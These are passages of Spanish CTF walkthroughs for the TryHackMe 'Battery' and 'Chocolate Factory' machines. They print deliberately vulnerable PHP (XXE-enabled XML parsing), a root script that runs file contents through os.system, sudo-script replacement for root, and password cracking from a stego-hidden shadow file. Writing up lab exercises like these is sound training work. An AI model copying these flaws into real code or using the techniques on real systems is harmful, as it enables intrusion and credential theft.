$sth-\u0026gt;execute(); $result = $sth-\u0026gt;fetchAll(); if($result) { foreach($result as $row) { if ($row[\u0026#39;username\u0026#39;]!==\u0026#39;\u0026#39;) { if ($row[\u0026#39;password\u0026#39;]!==\u0026#39;\u0026#39;) { $_SESSION[\u0026#39;favcolor\u0026#39;] = $row[\u0026#39;username\u0026#39;]; $_SESSION[\u0026#39;cnum\u0026#39;] = $row[\u0026#39;cno\u0026#39;]; $_SESSION[\u0026#39;bkname\u0026#39;] = $row[\u0026#39;bank_name\u0026#39;]; $_SESSION[\u0026#39;amont\u0026#39;] = $row[\u0026#39;amount\u0026#39;]; header(\u0026#34;Location: dashboard.php\u0026#34;); } } } } else { //A note from Admin of Bank Of CC : I have saved my credentials in a file , let\u0026#39;s see if you can find it ;) echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;umm...something bad happened\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; } } ?\u0026gt;     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94  \u0026lt;html\u0026gt; \u0026lt;style\u0026gt; [... REDACTED ...] \u0026lt;/style\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;scripts/jquery.min.js\u0026#34;\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function XMLFunction(){ var xml = \u0026#39;\u0026#39; + \u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026#39; + \u0026#39;\u0026lt;root\u0026gt;\u0026#39; + \u0026#39;\u0026lt;name\u0026gt;\u0026#39; + $(\u0026#39;#name\u0026#39;).val() + \u0026#39;\u0026lt;/name\u0026gt;\u0026#39; + \u0026#39;\u0026lt;search\u0026gt;\u0026#39; + $(\u0026#39;#search\u0026#39;).val() + \u0026#39;\u0026lt;/search\u0026gt;\u0026#39; + \u0026#39;\u0026lt;/root\u0026gt;\u0026#39;; var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = function () { if(xmlhttp.readyState == 4){ console.log(xmlhttp.readyState); console.log(xmlhttp.responseText); document.getElementById(\u0026#39;errorMessage\u0026#39;).innerHTML = xmlhttp.responseText; } } xmlhttp.open(\u0026#34;POST\u0026#34;,\u0026#34;forms.php\u0026#34;,true); xmlhttp.send(xml); }; \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;dashboard.php\u0026#34;\u0026gt;Dashboard\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;with.php\u0026#34;\u0026gt;Withdraw Money\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;depo.php\u0026#34;\u0026gt;Deposit Money\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;tra.php\u0026#34;\u0026gt;Transfer Money\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;acc.php\u0026#34;\u0026gt;My Account\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;forms.php\u0026#34;\u0026gt;command\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;logout.php\u0026#34;\u0026gt;Logout\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li style=\u0026#34;float:right\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;contact.php\u0026#34;\u0026gt;Contact Us\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;fieldset\u0026gt; \u0026lt;p\u0026gt; \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;Account Number\u0026lt;/label\u0026gt; \u0026lt;input id=\u0026#34;name\u0026#34; name=\u0026#34;name\u0026#34; type=\u0026#34;text\u0026#34; value=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;label for=\u0026#34;search\u0026#34;\u0026gt;Remark\u0026lt;/label\u0026gt; \u0026lt;input id=\u0026#34;search\u0026#34; name=\u0026#34;search\u0026#34; type=\u0026#34;text\u0026#34; value=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;button name=\u0026#34;snd\u0026#34; id=\u0026#34;Login\u0026#34; onclick=\u0026#34;XMLFunction()\u0026#34;\u0026gt;Send Message\u0026lt;/button\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php session_start(); if(isset($_SESSION[\u0026#39;favcolor\u0026#39;]) and $_SESSION[\u0026#39;favcolor\u0026#39;]===\u0026#34;admin@bank.a\u0026#34;) { libxml_disable_entity_loader (false); $xmlfile = file_get_contents(\u0026#39;php://input\u0026#39;); $dom = new DOMDocument(); $dom-\u0026gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $info = simplexml_import_dom($dom); $name = $info-\u0026gt;name; $search = $info-\u0026gt;search; echo \u0026#34;Sorry, account number $searchis not active!\u0026#34;; } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Only Admins can access this page!\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; session_destroy(); unset($_SESSION[\u0026#39;favcolor\u0026#39;]); header(\u0026#34;Refresh: 0.1; url=index.html\u0026#34;); } ?\u0026gt;       'use strict'; var containerId = JSON.parse(\"\\\"5639ee3794732e38\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  CYBER - USER Utilizamos las credenciales que encontramos en el servicio SSH y logramos obtener una shell y nuestra primera flag flag1.txt.\nPRIVILEGE ESCALATION Realizamos una enumeracion con este usuario y encontramos que puede ejecutar un script de python con sudo.\nA simple vista vemos un \u0026ldquo;efecto\u0026rdquo; de escritura, al investigar sobre este efecto encontramos que es posible realizarlo con las librerias sys y time, para comprobar esto y obtener informacion paramos el script utilizando CTRL + C. Y logramos ver que dicho script esta utilizando la libreria time.\n1 2 3 4 5 6 7 8 9 10  cyber@ubuntu:~$ sudo /usr/bin/python3 /home/cyber/run.py Hey Cyb^CTraceback (most recent call last): File \u0026#34;/home/cyber/run.py\u0026#34;, line 17, in \u0026lt;module\u0026gt; main(); File \u0026#34;/home/cyber/run.py\u0026#34;, line 12, in main delay_print(\u0026#34;Hey Cyber I have tested all the main components of our web server but something unusal happened from my end!\u0026#34;); File \u0026#34;/home/cyber/run.py\u0026#34;, line 8, in delay_print time.sleep(0.08) KeyboardInterrupt cyber@ubuntu:~$   Tambien realizamos una enumeracion utilizando pspy para ver si ejecutaba algun otro programa, y logramos ver que reinicia el servicio de apache cada vez que es ejecutado el script.\nEl problema es que no tenemos permisos de escritura o lectura sobre el archivo, pero como el archivo está dentro de la carpeta cyber podemos cambiar de nombre y eliminar dicho archivo, creamos uno nuevo con una shell inversa y lo ejecutamos con sudo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  cyber@ubuntu:~$ ls -lah total 1.2M drwx------ 3 cyber cyber 4.0K Jan 20 06:14 . drwxr-xr-x 4 root root 4.0K Nov 16 15:28 .. -rw------- 1 cyber cyber 0 Nov 17 19:47 .bash_history -rw-r--r-- 1 cyber cyber 220 Nov 9 21:06 .bash_logout -rw-r--r-- 1 cyber cyber 3.6K Nov 9 21:06 .bashrc drwx------ 2 cyber cyber 4.0K Nov 9 21:52 .cache -rw--w---- 1 cyber cyber 85 Nov 15 16:45 flag1.txt -rw-r--r-- 1 cyber cyber 675 Nov 9 21:06 .profile -rwx------ 1 root root 349 Nov 15 18:33 run.py cyber@ubuntu:~$ ls -ld . drwx------ 3 cyber cyber 4096 Jan 20 06:14 . cyber@ubuntu:~$   Logramos obtener una shell con usuario root y nuestra flag root.txt y tambien flag2.txt.\nANEXO CYBER ENUM Dentro del archivo auth.log encontramos algunos comandos ejecutados y un script en la carpeta del usuario yash, tambien informacion de un servicio FTP el cual no existe.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  [... REDACTED ...] Nov 16 16:59:47 ubuntu sudo: cyber : command not allowed ; TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=/usr/bin/python3 /home/cyber/run.py flag1.txt run.py Nov 16 17:00:43 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/python3 /home/cyber/run.py Nov 16 17:03:18 ubuntu sudo: yash : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/yash ; USER=root ; COMMAND=list Nov 16 17:18:59 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=list Nov 16 17:19:11 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 16 17:20:35 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 16 17:20:47 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 16 21:51:30 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=list Nov 16 21:51:55 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=/usr/bin/python3 /home/cyber/run.py Nov 16 21:56:13 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/python3 /home/cyber/run.py Nov 16 22:07:55 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=list Nov 16 22:10:47 ubuntu sudo: yash : TTY=pts/1 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 16 22:13:39 ubuntu sudo: yash : TTY=pts/1 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 17 10:37:06 ubuntu sudo: root : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/bin/chmod u+rwx emergency.py Nov 17 10:42:27 ubuntu sudo: root : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=list Nov 17 10:42:36 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=list Nov 17 10:42:50 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 17 10:43:48 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 17 10:45:47 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=list Nov 17 10:45:56 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=/usr/bin/python3 /home/cyber/run.py Nov 17 10:49:54 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=list Nov 17 10:50:03 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 17 10:50:26 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 17 12:21:11 ubuntu sudo: yash : command not allowed ; TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/apt-get install python-pip Nov 17 13:09:46 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=list Nov 17 13:09:56 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 17 17:03:00 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=list Nov 17 17:03:51 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=/usr/bin/python3 /home/cyber/run.py Nov 17 20:22:35 ubuntu sudo: root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/touch /var/log/aws114_ssm_agent_installation.log Jan 20 05:29:10 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=list Jan 20 05:29:37 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=/usr/bin/python3 /home/cyber/run.py   Dentro de la base de datos logramos encontrar una contraseña del usuario admin@bank.a pero no logramos conseguir nada con esta contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  cyber@ubuntu:/var$ mysql -u root -p Enter password: [... REDACTED ...] mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | details | | menagerie | | mysql | | performance_schema | +--------------------+ 5 rows in set (0.00 sec) mysql\u0026gt; use details; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +-------------------+ | Tables_in_details | +-------------------+ | users | +-------------------+ 1 row in set (0.00 sec) mysql\u0026gt; select * from users; +--------------+--------------------+-----+--------+-----------+ | username | password | cno | amount | bank_name | +--------------+--------------------+-----+--------+-----------+ | cyber | cyber | 14 | 0 | ABC | | admin@bank.a | I_know_my_password | 15 | 0 | ABC | | admin | pass | 17 | 0 | ABC | | check | check | 19 | 0 | ABC | | admin@bank.a | batman | 20 | 0 | ABC | +--------------+--------------------+-----+--------+-----------+ 5 rows in set (0.00 sec) mysql\u0026gt; use menagerie; Database changed mysql\u0026gt; show tables; Empty set (0.00 sec) mysql\u0026gt; exit Bye   ROOT ENUM Logramos confirmar que el script run.py utiliza las librerias sys,time asi mismo que reinicia el servicio apache.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  root@ubuntu:~# cat run,py cat run,py cat: run,py: No such file or directory root@ubuntu:~# cat /home/cyber/run.py.bak cat /home/cyber/run.py.bak import os,sys,time def delay_print(s): for c in s: sys.stdout.write(c) sys.stdout.flush() time.sleep(0.08) def main(): os.setuid(0); delay_print(\u0026#34;Hey Cyber I have tested all the main components of our web server but something unusal happened from my end!\u0026#34;); print(\u0026#34;\\n\u0026#34;) os.system(\u0026#39;service apache2 restart \u0026gt; /dev/null 2\u0026gt;\u0026amp;1\u0026#39;); main();   Tambien encontramos que el script (/home/yash/emergency.py) que aparece en el archivo de log auth.log existe y realiza la lectura del archivo /opt/binside.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  root@ubuntu:/home/yash# cat emergency.py cat emergency.py import os,time,sys def delay_print(s): for c in s: sys.stdout.write(c) sys.stdout.flush() time.sleep(0.04) def BinaryToDecimal(binary): string = int(binary, 2) return string str_data=\u0026#34;\u0026#34; print(\u0026#34;01110010 01100101 01100001 01100100 01101001 01101110 01100111 00100000 00101111 01101111 01110000 01110100 00101111 01100010 01101001 01101110 01110011 01101001 01100100 01100101 00100000 01100110 01101001 01101100 01100101\u0026#34;) try: with open(\u0026#39;/opt/binside\u0026#39;,\u0026#39;r\u0026#39;) as f: for p in f: for m in p.split(): inn=int(m,2) ass=chr(inn) str_data+=ass f=open(\u0026#39;/opt/binside\u0026#39;,\u0026#39;a\u0026#39;) delay_print(\u0026#34;checking if you are a human...................Test Failed [✘]\\n\\n\u0026#34;) f.write(str(os.system(str_data))) f.write(\u0026#34;\\n\u0026#34;) except Exception as e: time.sleep(4) delay_print(\u0026#34;checking if you are a human.....................Test Passed [✔]\\n\\n\u0026#34;) root@ubuntu:/home/yash#   ","description":"Battery es una maquina de TryHackMe, encontramos correos dentro de un fichero y mediante SQL Truncation Attack obtuvimos acceso a un panel de administracion en donde explotamos una vulnerabilidad XXE por la cual obtuvimos credenciales de acceso. La mala configuracion de permisos en un script de python nos permitio escalar privilegios.","id":22,"section":"posts","tags":["sql truncation","xxe","python","pspy"],"title":"TryHackMe - Battery","uri":"https://sckull.github.io/posts/battery/"},{"content":"  Chocolate Factory es una maquina de TryHackMe, obtuvimos acceso a un portal crackeando un contraseñas de un backup de shadow, ejecutamos una shell inversa y obtuvimos acceso por SSH con una clave privada. Escalamos privilegios utilizando Sudo junto con Vi y finalmente para obtener nuestra ultima flag utilizamos Python.\nRoom    Titulo Chocolate Factory      Descripción A Charlie And The Chocolate Factory themed room, revisit Willy Wonka\u0026rsquo;s chocolate factory!   Puntos 120   Dificultad Facil   Maker 0x9747  saharshtapi  AndyInfoSec     NMAP Escaneo de puertos con nmap nos muestra varios puertos abiertos, pero nos interesan por el momento a los que podemos acceder: ftp (21), ssh (22) y http (http).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109  # Nmap 7.80 scan initiated Tue Jan 19 20:53:24 2021 as: nmap -p- --min-rate 1000 -o scanPorts chocolat.thm Warning: 10.10.0.127 giving up on port because retransmission cap hit (10). Nmap scan report for chocolat.thm (10.10.0.127) Host is up (0.30s latency). Not shown: 64450 closed ports, 1056 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 100/tcp open newacct 101/tcp open hostname 102/tcp open iso-tsap 103/tcp open gppitnp 104/tcp open acr-nema 105/tcp open csnet-ns 106/tcp open pop3pw 107/tcp open rtelnet 108/tcp open snagas 109/tcp open pop2 110/tcp open pop3 111/tcp open rpcbind 112/tcp open mcidas 113/tcp open ident 114/tcp open audionews 115/tcp open sftp 116/tcp open ansanotify 117/tcp open uucp-path 118/tcp open sqlserv 119/tcp open nntp 120/tcp open cfdptkt 121/tcp open erpc 122/tcp open smakynet 123/tcp open ntp 124/tcp open ansatrader 125/tcp open locus-map # Nmap done at Tue Jan 19 20:55:58 2021 -- 1 IP address (1 host up) scanned in 153.60 seconds # Nmap 7.80 scan initiated Tue Jan 19 21:02:09 2021 as: nmap -sV -sC -o servPorts chocolat.thm Nmap scan report for chocolat.thm (10.10.0.127) Host is up (0.30s latency). Not shown: 989 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 |_auth-owners: ERROR: Script execution failed (use -d to debug) | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-rw-r-- 1 1000 1000 208838 Sep 30 14:31 gum_room.jpg | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.2.29.162 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |_auth-owners: ERROR: Script execution failed (use -d to debug) | ssh-hostkey: | 2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA) | 256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA) |_ 256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 100/tcp open newacct? |_auth-owners: ERROR: Script execution failed (use -d to debug) | fingerprint-strings: | HTTPOptions, RTSPRequest: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; [... REDACTED ...] 125/tcp open locus-map? |_auth-owners: ERROR: Script execution failed (use -d to debug) | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port100-TCP:V=7.80%I=7%D=1/19%Time=60078F67%P=x86_64-pc-linux-gnu%r(HTT SF:POptions,20F,\u0026#34;\\\u0026#34;Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x2 [... REDACTED ...] SF:!\\x20;\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\\u0026#34;\\x20\u0026#34;); Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jan 19 21:08:06 2021 -- 1 IP address (1 host up) scanned in 356.86 seconds   FTP En el servicio FTP encontramos una imagen la cual contenia un archivo embebido codificado en base64, al decodificarlo encontramos la contraseña encriptada del usuario charlie.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  kali@kali:~/thm/chocolat$ ftp chocolat.thm Connected to chocolat.thm. 220 (vsFTPd 3.0.3) Name (chocolat.thm:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 65534 65534 4096 Oct 01 12:11 . drwxr-xr-x 2 65534 65534 4096 Oct 01 12:11 .. -rw-rw-r-- 1 1000 1000 208838 Sep 30 14:31 gum_room.jpg 226 Directory send OK. ftp\u0026gt; get gum_room.jpg local: gum_room.jpg remote: gum_room.jpg 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes). 226 Transfer complete. 208838 bytes received in 4.01 secs (50.8460 kB/s) ftp\u0026gt; exit 221 Goodbye. kali@kali:~/thm/chocolat$ file gum_room.jpg gum_room.jpg: JPEG image data, Exif standard: [TIFF image data, big-endian, direntries=0], baseline, precision 8, 1920x1080, components 3 kali@kali:~/thm/chocolat$ steghide extract -sf gum_room.jpg Enter passphrase: wrote extracted data to \u0026#34;b64.txt\u0026#34;. kali@kali:~/thm/chocolat$ head b64.txt ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6 KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4 MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5 OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3 Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6 Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6 OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4 kali@kali:~/thm/chocolat$ cat b64.txt |base64 -d daemon:*:18380:0:99999:7::: bin:*:18380:0:99999:7::: sys:*:18380:0:99999:7::: sync:*:18380:0:99999:7::: [... REDACTED ...] _gvm:*:18496:0:99999:7::: charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/[... REDACTED ...]uKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7::: kali@kali:~/thm/chocolat$   Utilizamos john para obtener la contraseña de charlie.\n1 2 3 4 5 6 7 8 9 10 11  kali@kali:~/thm/chocolat$ john --wordlist=/usr/share/wordlists/rockyou.txt charlie_hash Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status cn[... REDACTED ...]4 (charlie) 1g 0:00:06:52 DONE (2021-01-19 21:24) 0.002426g/s 2389p/s 2389c/s 2389C/s cocker6..cn123 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed kali@kali:~/thm/chocolat$   PORTS Encontramos una lista larga de puertos a los cuales realizamos una conexion pero en cada puerto mostraba el mismo mensaje junto con un posible nombre de usuario (Augustus) hasta que logramos encontrar uno donde indicaba la direccion de un archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  kali@kali:~/thm/chocolat$ nc -vvv chocolat.thm 112 chocolat.thm [10.10.0.127] 112 (?) open \u0026#34;Welcome to chocolate room!! ___ ___ ___ ___ ___.---------------. .\u0026#39;\\__\\\u0026#39;\\__\\\u0026#39;\\__\\\u0026#39;\\__\\\u0026#39;\\__,` . ____ ___ \\ \\|\\/ __\\/ __\\/ __\\/ __\\/ _:\\ |:. \\ \\___ \\ \\\\\u0026#39;\\__\\\u0026#39;\\__\\\u0026#39;\\__\\\u0026#39;\\__\\\u0026#39;\\_`.__| `. \\ \\___ \\ \\\\/ __\\/ __\\/ __\\/ __\\/ __: \\ \\\\\u0026#39;\\__\\\u0026#39;\\__\\\u0026#39;\\__\\ \\__\\\u0026#39;\\_;-----------------` \\\\/ \\/ \\/ \\/ \\/ : | \\|______________________;________________| A small hint from Mr.Wonka : Look somewhere else, its not here! ;) I hope you wont drown Augustus\u0026#34; ^C sent 0, rcvd 527 kali@kali:~/thm/chocolat$ nc -vvv chocolat.thm 113 chocolat.thm [10.10.0.127] 113 (auth) open http://localhost/key_rev_key \u0026lt;- You will find the key here!!! ^C sent 0, rcvd 62   Descargamos el archivo, encontramos que es un archivo ejecutable, al pasarle strings sobre este encontramos un \u0026ldquo;nombre\u0026rdquo; de usuario el cual utilizamos para pasarselo, lo que nos devolvio una clave.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  kali@kali:~/thm/chocolat$ file key_rev_key key_rev_key: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8273c8c59735121c0a12747aee7ecac1aabaf1f0, not stripped kali@kali:~/thm/chocolat$ strings key_rev_key /lib64/ld-linux-x86-64.so.2 [... REDACTED ...] =9 AWAVI AUATL []A\\A]A^A_ Enter your name: laksdhfas congratulations you have found the key: 